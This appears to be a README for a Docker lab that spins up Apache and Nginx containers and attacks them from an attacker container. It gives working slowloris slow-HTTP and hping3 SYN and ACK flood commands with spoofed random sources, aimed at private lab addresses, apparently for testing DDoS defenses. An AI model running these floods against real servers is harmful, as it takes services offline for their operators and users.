
# build images and run containers

```bash
docker-compose -f stack.yml up -d --build
```

# --------------------------------------------------------------------------- #
#                               HTTP flood attack                             # 
# --------------------------------------------------------------------------- #

# Launch the slowloris(slow HTTP GET attack) attack against the apache-server

```bash
docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.20.0.2 -s 1000"
```

# Launch the slowloris(slow HTTP GET attack) attack against the nginx-server

```bash
docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.20.0.3 -s 1000"
```
# --------------------------------------------------------------------------- #
#                               SYN flood attack                              # 
# --------------------------------------------------------------------------- #

# Launch the SYN flood attack against the apache-server

```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.2"
```

# Launch the SYN flood attack against the nginx-server

```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.3"
```

# --------------------------------------------------------------------------- #
#                               ACK flood attack                              # 
# --------------------------------------------------------------------------- #

# Launch the ACK flood attack against the apache-server

```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.2"
```

# Launch the ACK flood attack against the nginx-server

```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.3"
```

# stop and remove containers   

```bash
docker-compose -f stack.yml down
```

 
